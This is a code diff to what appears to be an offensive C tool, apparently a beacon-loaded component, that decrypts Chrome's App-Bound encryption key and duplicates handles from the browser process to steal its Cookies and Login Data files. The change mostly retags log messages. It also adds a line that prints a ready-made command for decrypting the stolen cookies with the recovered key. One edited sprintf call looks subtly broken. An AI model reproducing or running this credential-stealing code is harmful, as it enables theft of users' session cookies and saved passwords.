@@ -295,7 +295,8 @@ VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, cons
         //printf("Decryption succeeded.\n");
         DWORD decrypted_size = SysStringByteLen(plaintext_data);
         //printf("Decrypted Data Size: %d\n", decrypted_size);
-        printf("[DEBUG] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        printf("[SUCCESS] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
+        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`",BytesToHexString(plaintext_data, decrypted_size));
 
     } else {
         printf("[ERROR] App Bound Key Decryption failed. Last error: %lu\n[ERROR] If error 203, beacon is most likely not operating out of correct file path. \n[ERROR] You must run this out of the web browser's application directory (ie 'C:\\Program Files\\Google\\Chrome\\Application'\n", last_error);
@@ -536,7 +537,6 @@ VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath
     
     
     //iterate through each handle to find browser process
-    printf("[DEBUG] Looking for %s Data \n", browser);
     if(Process32First(hSnap, &pe32)) {
         do {
             if(strcmp(pe32.szExeFile, browserProcess) == 0) 
@@ -636,11 +636,12 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if(status == STATUS_INFO_LENGTH_MISMATCH)
     {
+        printf("[ERROR] STATUS_INFO_LENGTH_MISMATCH\n");
         dwSize = dwNeeded;
         shi = (SYSTEM_HANDLE_INFORMATION_EX*)GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
         if (dwSize == NULL)
         {
-            printf("Failed to reallocate memory for handle information.\n");
+            printf("[ERROR] Failed to reallocate memory for handle information.\n");
             GlobalFree(shi);
             return FALSE;
         }
@@ -648,11 +649,11 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
     status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
     if(status != 0)
     {
-        printf("NtQuerySystemInformation failed with status 0x%x.\n",status);
+        printf("[ERROR] NtQuerySystemInformation failed with status 0x%x.\n",status);
         GlobalFree(shi);
         return FALSE;
     }
-    //printf("Handle Count %d\n", shi->NumberOfHandles);
+    //printf("[DEBUG] Handle Count %d\n", shi->NumberOfHandles);
     DWORD i = 0;
     BOOL firstHandle = TRUE;
     //iterate through each handle and find our PID and a handle to a file
@@ -666,7 +667,7 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
             if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                 HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                 if(hProc == INVALID_HANDLE_VALUE) {
-                    printf("OpenProcess failed %d\n", GetLastError());
+                    printf("[ERROR] OpenProcess failed %d\n", GetLastError());
                     GlobalFree(shi);
                     free(objectNameInfo);
                     return FALSE;
@@ -674,13 +675,13 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
 
                 HANDLE hDuplicate = NULL;
                 if(!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
-                    //printf("DuplicateHandle failed %d\n", GetLastError());
+                    //printf("[DEBUG] DuplicateHandle failed %d\n", GetLastError());
                     continue;                  
                 }
                 //Check if the handle exists on disk, otherwise the program will hang
                 DWORD fileType = GetFileType(hDuplicate);
                 if (fileType != FILE_TYPE_DISK) {
-                    //printf("NOT A FILE");
+                    //printf("[DEBUG] NOT A FILE\n");
                     continue;
                 }
                 //printf("Duplicated Handle, confirmed file on disk");
@@ -688,28 +689,28 @@ BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR *
                 
                 if (ret != 0)
                 {
-                    printf("Failed NtQueryObject");
+                    printf("[ERROR] Failed NtQueryObject\n");
                     GlobalFree(shi);
                     free(objectNameInfo);
                     return FALSE;
                 }
                 if (ret == 0 && objectNameInfo->Name.Length > 0){
                     char handleName[1024];
-                    sprintf(handleName, "%.*ws", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
+                    sprintf(handleName, MAX_PATH, L"%.*s", objectNameInfo->Name.Length / sizeof(WCHAR), objectNameInfo->Name.Buffer);
 
                     PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
                     ret = NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
+                    printf("%d",ret);
                     if (ret != 0)
                     {
-                        printf("Failed NtQueryObject");
+                        printf("[ERROR] Failed NtQueryObject");
                         GlobalFree(shi);
                         free(objectTypeInfo);
                         free(objectNameInfo);
                         return FALSE;
                     }
                     if (ret == 0 && (strcmp(objectTypeInfo,"File"))){
-                        //printf("%s\n", handleName);
-                        //printf("%d\n", strlen(handleName));
+                        printf("[DEBUG] handleName: %s\n", handleName);
                         if (strstr(handleName, browserFile) != NULL && (strcmp(&handleName[strlen(handleName) - 4], "Data") == 0 || strcmp(&handleName[strlen(handleName) - 7], "Cookies") == 0)){
 
                             printf("Handle to %s Was FOUND with PID: %lu\n", browserFile, PID);
